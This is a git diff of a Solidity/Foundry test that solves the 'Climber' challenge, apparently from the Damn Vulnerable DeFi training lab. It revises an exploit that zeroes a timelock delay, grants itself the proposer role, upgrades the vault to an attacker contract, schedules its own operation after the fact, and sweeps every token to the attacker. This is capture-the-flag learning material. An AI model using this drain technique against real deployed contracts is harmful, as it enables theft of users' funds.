@@ -61,7 +61,8 @@ contract Climber is Test {
         assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));
 
         assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));
-
+      
+ 
         // Deploy token and transfer initial token balance to the vault
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
@@ -81,26 +82,30 @@ contract Climber is Test {
         AttackVault av = new AttackVault();
         console.log("ADMIN - ", climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), address(climberTimelock)));
         console.log("AV - ", address(av));
-        bytes[] memory data = new bytes[](3);
+        bytes[] memory data = new bytes[](4);
         data[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);
-        data[1] = abi.encodeWithSelector(climberImplementation.upgradeTo.selector, address(av));
-        data[2] = abi.encodeWithSelector(av.sweepFunds.selector, address(dvt),climberVaultProxy, attacker, climberTimelock,climberImplementation);
+        data[1] = abi.encodeWithSelector(climberTimelock.grantRole.selector, climberTimelock.PROPOSER_ROLE(),address(climberVaultProxy));
+        data[2] = abi.encodeWithSelector(climberImplementation.upgradeTo.selector, address(av));
+        data[3] = abi.encodeWithSelector(av.sweepFunds.selector, address(dvt),climberVaultProxy, attacker, address(av), climberTimelock,climberImplementation);
        
-        uint256[] memory values = new uint256[](3);
+        uint256[] memory values = new uint256[](4);
         values[0] = 0;
         values[1] = 0;
         values[2] = 0;
-        address[] memory addresses = new address[](3);
+        values[3] = 0;
+        address[] memory addresses = new address[](4);
         addresses[0] = address(climberTimelock);
-        addresses[1] = address(climberVaultProxy);
+        addresses[1] = address(climberTimelock);
         addresses[2] = address(climberVaultProxy);
+        addresses[3] = address(climberVaultProxy);
+        climberTimelock.getOperationId(addresses, values, data, 0x0);
         climberTimelock.execute(addresses,values, data, 0x0);
         vm.stopPrank();
         /**
          * EXPLOIT END *
          */
-        // validation();
-        // console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        validation();
+        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
     function validation() internal {
@@ -141,23 +146,25 @@ contract AttackVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
     }
 
     // Allows trusted sweeper account to retrieve any tokens
-    function sweepFunds(address tokenAddress,  address climberVaultProxy, address recepient, ClimberTimelock timelock, ClimberVault climberImplementation) external {
-        bytes[] memory data = new bytes[](3);
-        data[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
-        data[1] = abi.encodeWithSelector(climberImplementation.upgradeTo.selector, address(this));
-        data[2] = abi.encodeWithSelector(this.sweepFunds.selector, tokenAddress,climberVaultProxy, recepient, timelock,climberImplementation);
+    function sweepFunds(address tokenAddress,  address climberVaultProxy, address recepient, address av, ClimberTimelock climberTimelock, ClimberVault climberImplementation) external {
+        bytes[] memory data = new bytes[](4);
+        data[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);
+        data[1] = abi.encodeWithSelector(climberTimelock.grantRole.selector, climberTimelock.PROPOSER_ROLE(),address(climberVaultProxy));
+        data[2] = abi.encodeWithSelector(climberImplementation.upgradeTo.selector, av);
+        data[3] = abi.encodeWithSelector(this.sweepFunds.selector, tokenAddress,climberVaultProxy, recepient, av,climberTimelock,address(climberImplementation));
        
-        uint256[] memory values = new uint256[](3);
+        uint256[] memory values = new uint256[](4);
         values[0] = 0;
         values[1] = 0;
         values[2] = 0;
-        address[] memory addresses = new address[](3);
-        addresses[0] = address(timelock);
-        addresses[1] = address(climberVaultProxy);
+        values[3] = 0;
+        address[] memory addresses = new address[](4);
+        addresses[0] = address(climberTimelock);
+        addresses[1] = address(climberTimelock);
         addresses[2] = address(climberVaultProxy);
-
-        //address(msg.sender).delegatecall(abi.encodeWithSelector(
-            timelock.schedule(addresses, values, data, 0x0);
+        addresses[3] = address(climberVaultProxy);
+         climberTimelock.getOperationId(addresses, values, data, 0x0);
+        climberTimelock.schedule(addresses, values, data, 0x0);
         IERC20 token = IERC20(tokenAddress);
         require(token.transfer(recepient, token.balanceOf(address(this))), "Transfer failed");
     }
